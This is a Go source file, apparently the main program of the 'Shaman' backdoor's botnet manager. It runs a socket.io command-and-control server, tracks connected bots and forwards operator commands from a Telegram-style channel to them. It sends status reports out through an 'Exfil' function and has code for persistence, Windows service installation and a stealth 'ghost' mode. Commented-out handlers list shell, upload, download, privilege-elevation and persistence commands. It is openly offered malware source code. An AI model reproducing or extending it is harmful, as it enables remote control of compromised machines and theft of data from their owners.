package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/gryphon"
	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/cloud"
	"github.com/whiterabb17/shaman/package/commands"
	"github.com/whiterabb17/shaman/package/install"
	"github.com/whiterabb17/shaman/package/util"
	"golang.org/x/sys/windows/svc"
)

var (
	verbose  bool
	vverbose bool
	debug    bool
	outfile  string
	sleep    int
	ghost    bool
	//initialized bool = false
	//loop        int  = 0
)
var (
	//StopHeartbeat signals the associated goroutine to stop when it is closed.
	StopHeartbeat chan struct{}
	Genesis       int
)

func init() {
	flag.BoolVar(&debug, "dbg", false, " DEBUG")
	flag.BoolVar(&verbose, "ver", false, " VERBOSE")
	flag.BoolVar(&vverbose, "vv", false, " FULL DEBUG")
	flag.StringVar(&outfile, "out", "", " File to write output to")
	flag.IntVar(&sleep, "s", 5, " Time in seconds to sleep")
	flag.BoolVar(&ghost, "ghst", false, " Start in Spirit Mode")
	//Patch os.Args[0] to work with absolute paths later
	if fp, err := os.Executable(); err == nil {
		os.Args[0] = fp
	}
}

func checkSwitch(sw string) bool {
	for _, arg := range os.Args[1:] {
		if arg == sw {
			return true
		}
	}
	return false
}

/*
	func register(wg *sync.WaitGroup, debug bool) {
		bot, err := tgbotapi.NewBotAPI(util.ListToken)
		if err != nil {
			log.Println(err)
		}
		bot.Debug = debug
		if util.Dbg {
			log.Printf("Authorized on account %s", bot.Self.UserName)
		}

		beat := beatConfig{
			header: "\t\t		~~SHAMAN BACKDOOR~~ \n\t\t Identifier: **" + util.ID + "**",
		}
		str := beat.Format()
		msg := tgbotapi.NewMessage(util.ChatID, str)
		bot.Send(msg)
		wg.Done()
	}
*/
const mngr bool = true

var (
	cycle int = 0
)

func main() {
	flag.Parse()
	log.SetFlags(0)
	if outfile != "" {
		logFile, err := os.OpenFile(outfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, os.ModeAppend|os.ModePerm)
		if err != nil {
			log.Println("Open output file failed")
		}

		defer logFile.Close()
		out := io.MultiWriter(os.Stdout, logFile)
		log.SetOutput(out)
	} else {
		out := io.MultiWriter(os.Stdout)
		log.SetOutput(out)
	}
	util.ID, _ = os.Hostname()
	util.Doze = sleep
	log.Println(os.Args[0])
	log.Println("Sleeping for " + strconv.Itoa(util.Doze) + " seconds")
	time.Sleep(time.Duration(util.Doze) * time.Second)
	if verbose {
		log.Println("VERBOSE: True")
	}
	if debug {
		log.Println("DEBUG Mode: Enabled")
		util.Dbg = true
	} else {
		if strings.Contains(os.Args[0], "ShamanCLI.exe") {
			log.Println("[*] DEBUG")
			util.Dbg = true
			debug = true
		} else {
			util.Dbg = false
			debug = false
		}
	}
	util.Spirit = ghost

	//Check single instance
	util.CheckSingle()
	/*
		wg := &sync.WaitGroup{}
		wg.Add(1)
		register(wg, debug)
		wg.Wait()
	*/
	//Check persistence
	if !debug {
		if !mngr {
			log.Println("Production Mode: Persisting Mode Enabled")
			if !install.IsInstalled() {
				log.Println("Install info does not exist")
				install.Install()
			} else {
				install.ReadInstallInfo()
				log.Println("Already installed")
			}
			log.Println("Production Mode: Service Mode Enabled")
			if os.Getenv("poly") == "" {
				if chk, _ := svc.IsWindowsService(); chk {
					install.HandleService(main)
				}
			}
			os.Chdir(install.Info.Base)
		} else {
			log.Println("Running in Manager Mode")
		}
	}

	time.Sleep(3 * time.Second)
	go mainHandler(debug)
	cloud.Status = false
	// Listen on an endpoint

	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	util.C1 = true
	util.C3 = false
	// --- caller is default handlers

	//on connection handler, occurs once for each connected client
	server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		cloud.ClientIdList = append(cloud.ClientIdList, c.Id())
		log.Println("New client connected, client id is ", c.Id())
		api.Exfil("New client connected, client id is <b>" + c.Id() + "</b>")
		//c.Emit("ack", cloud.Spell{"ACKREQ", "Please provide the access key"})
	})
	//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
	//you can omit function args if you do not need them
	//you can return string value for ack, or return nothing for emit
	server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
		var temp []string
		for _, s := range cloud.ClientIdList {
			if s != c.Id() {
				temp = append(temp, s)
			}
		}
		cloud.ClientIdList = temp
		temp = nil
		log.Println("Client Disconnected, client id is ", c.Id())
		api.Exfil("[<i>!</i>] Client Disconnected, client id is <b>" + c.Id() + "</b>")
	})
	//error catching handler
	server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
		log.Println("Error from " + c.Id())
		api.Exfil("[<i>!</i>] Error from <b>" + c.Id() + "</b>")
	})
	server.On("repl", func(c *gophersocket.Channel, resp cloud.Resp) {
		response := util.Fb64(resp.Resp)
		tag := util.Fb64(resp.Tag)
		api.Exfil(fmt.Sprintf("BOT: <b>%s</b>\n\nReponse: <i>%s</i>", tag, response))
	})
	server.On("error", func(c *gophersocket.Channel, resp cloud.Resp) {
		response := util.Fb64(resp.Resp)
		tag := util.Fb64(resp.Tag)
		api.Exfil(fmt.Sprintf("BOT: <b>%s</b>\n\n<u>Error Encountered</u>\nReponse: <i>%s</i>", tag, response))
	})

	// --- Cert Generatation Event Request
	server.On("CReq", func(c *gophersocket.Channel, resp cloud.Resp) {
		// priv, pub := cert.GenerateKeys()
		// key,err := gryphon.ReadFile(pub)
		// if err != nil {
		//	 api.Exfil("Failed generating Certificate & Key pair for " + util.Fb64(resp.Tag))
		// } else {
		//	 c.Emit("CRes", cloud.Spell{Key: util.Tb64("Pub"), Val: util.Tb64(key)})
		// 		api.Exfil("Public key sent successfully")
		// }
		//
	})
	// --- End Cert Gen Events

	// --- caller is custom handler
	server.On("kAck", func(c *gophersocket.Channel, vals cloud.Spell) {
		if vals.Key == "pAck" && vals.Val == "DOReq" {
			c.Emit("aAck", cloud.Spell{Key: "", Val: ""})
		}
	})
	//custom event handler
	server.On("rAck", func(c *gophersocket.Channel, msg cloud.Spell) string {
		log.Println("Return ACK Recieved, validating...")
		c.Emit("ack", cloud.Spell{Key: "ack", Val: "Return ACK Recieved, validating..."})

		if msg.Key == "cAck" {
			if !util.C3 {
				c.Emit("ack", cloud.Spell{Key: "STATUS", Val: "Spirit"})
				time.Sleep(10 * time.Second)
				c.Emit("ack", cloud.Spell{Key: "PREM", Val: "Accessing Corporeal Form"})
				time.Sleep(10 * time.Second)
				c.Emit("gAck", cloud.Spell{Key: "", Val: ""})
				if msg.Val == util.Mycellium {
					install.Restart("s:5 f:H dbg ver")
				}
			} else {
				c.Emit("ack", cloud.Spell{Key: "STATUS", Val: "Worldly"})
				time.Sleep(10 * time.Second)
				c.Emit("ack", cloud.Spell{Key: "PREM", Val: "Returning to Spirit Form"})
				time.Sleep(10 * time.Second)
				c.Emit("ack", cloud.Spell{Key: "ConCTX", Val: gryphon.GetGlobalIp()})
				time.Sleep(10 * time.Second)
				c.Emit("wAck", cloud.Spell{Key: "", Val: ""})
				if msg.Val == util.Mycellium {
					install.Restart("-s 5 -ghst")
				}
			}
		}
		return "result"
	})
	//setup http server like caller for handling connections
	cloud.Keeper = server
	cloud.Status = true
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", server)
	log.Println(http.ListenAndServe(":55556", serveMux))
	//nodeHeartBeat()
	/*
		bot := telego.Initialise(util.BotToken)
		util.TClient = bot.Client
		str := commands.Info()
		bot.Client.SendMessageText(str, util.ChatID)
		bot.SetDefaultMessageHandler(commands.HelpHandler)
		bot.AddCommandHandler("list", commands.ListHandler)
		bot.AddCommandHandler("ping", commands.PingHandler)
		bot.AddCommandHandler("persist", commands.PersistHandler)
		bot.AddCommandHandler("info", commands.InfoHandler)
		bot.AddCommandHandler("soft", commands.SoftHandler)
		bot.AddCommandHandler("root", commands.ElevateHandler)
		bot.AddCommandHandler("gryphon", commands.GrypHandler)
		bot.AddCommandHandler("dl", commands.DlHandler)
		bot.AddCommandHandler("sh", commands.ShellHandler)
		bot.AddCommandHandler("up", commands.UploadHandler)
		bot.AddCommandHandler("inst", commands.InstHandler)
		bot.AddCommandHandler("evolve", commands.EvolveHandler)
		bot.AddCommandHandler("remove", commands.UninstallHandler)
		bot.Listen()
	*/
}

/*
func nodeHeartBeat() {
	StopHeartbeat = make(chan struct{})
	Ticker := time.NewTicker(util.Interval * time.Second)
	for {
		select {
		case <-Ticker.C:
			if !cloud.Status {
				log.Println("Server Status: Inactive")
				log.Println("Attempting to restart")
				cloud.Keeper, cloud.Status = cloud.CreateCloudNode()
			} else {
				log.Println("Server Status: Active")
			}
		case <-StopHeartbeat:
			Ticker.Stop()
			log.Println("Heartbeat stopped")
			return
		}
	}
}
*/
// Create CMD Rebroadcaster based on Recieved/Executed/Resent Messages
func mainHandler(debug bool) {
	util.C3 = true
	api.NewGenesis()
	log.Println("Summoning ID: ", api.Genesis)
	go api.Heartbeat()
	api.Exfil(commands.InitInfo())
	for u := range api.Updates {
		if u.Message == nil {
			time.Sleep(15 * time.Second)
			continue
		}
		cloud.CommsHistory = append(cloud.CommsHistory, u.Message.Text)
		util.WriteLog("CMD.History", strconv.Itoa(u.Message.MessageID)+" "+u.Message.Text)
		if debug {
			log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		}
		if u.Message.Command() == "list" {
			str := "<b>Bot List</b>\n\n"
			for _, s := range cloud.ClientIdList {
				str += "<i>" + s + "</i>\n"
			}
			api.Exfil(str)
		} else {
			switch strings.ToLower(u.Message.Text) {
			case "help":
				log.Println("Operator asked for help")
				api.Exfil(string(commands.Help))
			case "ghelp":
				commands.GExfil2(commands.GHelp)
			case "list":
				str := "<b>Bot List</b>\n\n"
				for _, s := range cloud.ClientIdList {
					str += "<i>" + s + "</i>\n"
				}
				api.Exfil(str)
			case "nodestatus":
				if cloud.Status {
					api.Exfil("<b>Cloud Node</b>: <i>Active</i>")
				} else {
					api.Exfil("<b>Cloud Node</b>: <i>Inactive</i>")
				}
			default:
				mgr, cmd, args, cnt, id := commands.ProcessMsg(u.Message.Text)
				var _args string
				for _, s := range args {
					_args = s + " "
				}
				cloud.ExecHistory = append(cloud.ExecHistory, cmd)
				util.WriteLog("Com.Traffic", strconv.Itoa(u.Message.MessageID)+" Cmd: "+cmd+"\nArgs: "+_args+"\nID: "+id)
				if mgr {
					go commands.ManagerSwitch(cmd)
				} else {
					if util.Dbg {
						api.Exfil("<i>" + cmd + "</i> was dispatched to <b>" + id + "</b> successfully")
					}
					go commands.Dispatcher(cmd, args, cnt, id)
				}
			}
			time.Sleep(15 * time.Second)
		}
	}
}
